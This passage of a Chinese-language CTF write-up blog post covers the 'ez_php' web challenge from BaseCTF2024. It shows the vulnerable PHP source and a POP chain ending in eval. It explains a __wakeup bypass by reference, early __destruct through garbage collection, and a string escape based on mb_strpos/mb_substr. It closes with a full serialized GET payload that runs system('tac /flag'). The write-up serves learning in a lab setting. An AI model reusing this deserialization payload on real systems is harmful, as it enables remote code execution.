    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">=</span><span class="token variable">$start</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfer/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacker！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">t</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;&#123;&#123;'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$pre</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"substr"</span><span class="token punctuation">;</span>
    <span class="token variable">$ser_ctf</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$pre</span><span class="token operator">.</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser_ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"杂鱼~杂鱼~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span></code></pre>

<p>先是pop链子</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Hacker</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">C</span><span class="token operator">::</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">T</span><span class="token operator">::</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">F</span><span class="token operator">::</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">E</span><span class="token operator">::</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">R</span><span class="token operator">::</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>接着是绕 <code>__wakeup</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
	<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>下边有一个赋值的操作，所以可以使用引用绕过，当<code>end</code>和<code>username</code>相互引用时，修改<code>end</code>的值也是在修改<code>username</code>的值。</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span></code></pre>

<p>接着是绕过<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code>，这里有一个异常抛出，使得<code>__destruct</code>并不能触发，这时就需要使用gc回收的机制，使<code>__destruct</code>提前触发，让<code>pop</code>链能够往后走</p>
<p>参考连接：<a target="_blank" rel="noopener" href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></p>
<p>Pop:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">R</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span><span class="token operator">-></span><span class="token property">r</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'2'</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// a:2:&#123;i:1;O:6:"Hacker":3:&#123;s:5:"start";O:1:"C":1:&#123;s:1:"c";O:1:"T":1:&#123;s:1:"t";O:1:"F":1:&#123;s:1:"f";O:1:"E":1:&#123;s:1:"e";O:1:"R":1:&#123;s:1:"r";s:20:"system('tac /flag');";&#125;&#125;&#125;&#125;&#125;s:3:"end";N;s:8:"username";R:9;&#125;i:1;N;&#125;</span>
</span></code></pre>

<p>将最后<code>i:2;N;</code>替换为<code>i:1;N;</code>利用gc回收使<code>__destruct</code>提前触发</p>
<p>特殊变量名 <code>ez_ser.from_you</code>，传入<code>ez[ser.from_you</code>即可绕过</p>
<p>接下来就是字符串逃逸</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>参考链接 <a target="_blank" rel="noopener" href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">CTFshow_XGCTF_Ezzz_php</a>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18187578">mb_strpos与mb_substr执行差异导致的漏洞</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节
每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节
每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</code></pre>

<p><img src="ez_php.png" loading="lazy"></p>
<p><img src="ez_php2.png" loading="lazy"></p>
<p>于是构造绕过之前多余字符串</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">210</span><span class="token punctuation">:</span>"<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span></code></pre>

<p>Payload:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>substr<span class="token operator">=</span><span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">&amp;</span>ez<span class="token punctuation">[</span>ser<span class="token operator">.</span>from_you<span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"T"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"F"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"E"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"R"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"end"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token constant">R</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Hsad</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://hsad.xyz/2024/08/18/BaseCTF2024-web/" title="BaseCTF2024-web">https://hsad.xyz/2024/08/18/BaseCTF2024-web/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF/" rel="prev" title="2024羊城杯"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">2024羊城杯</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="next" title="web入门-代码审计"><span class="post-nav-text">web入门-代码审计</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Hsad</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>